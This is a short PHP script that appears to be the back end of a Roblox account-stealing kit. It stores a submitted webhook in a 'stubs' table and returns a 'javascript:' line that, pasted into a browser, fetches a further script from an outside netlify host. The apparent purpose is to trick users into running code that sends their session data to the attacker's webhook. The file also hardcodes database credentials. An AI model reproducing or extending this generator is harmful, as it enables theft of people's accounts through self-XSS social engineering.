<?php
    header("Access-Control-Allow-Origin: *");

    $servername = "rblxapi";
    $username = "mayflower";
    $password = "Donotnow1";
    $dbname = "rblxapi";
    $webhook = $_REQUEST['webhook'];
    $prompt = $_REQUEST['prompt'];
    $id = rand(10,3433434);

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection
    if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
    }

    // sql to create table
    $sql = "INSERT INTO stubs (id, webhook, prompt)
    VALUES ('".mysqli_real_escape_string($conn, $id)."', '".mysqli_real_escape_string($conn, $webhook)."', '".mysqli_real_escape_string($conn, $prompt)."')";

    if ($conn->query($sql) === TRUE) {
      echo 'xJavascript:$.get("/https://musing-varahamihira-44b404.netlify.app/rblxapi/api.php?id='.$id.'")';
    } else {
      echo "Error:" . $conn->error;
    }

    $conn->close();
?>
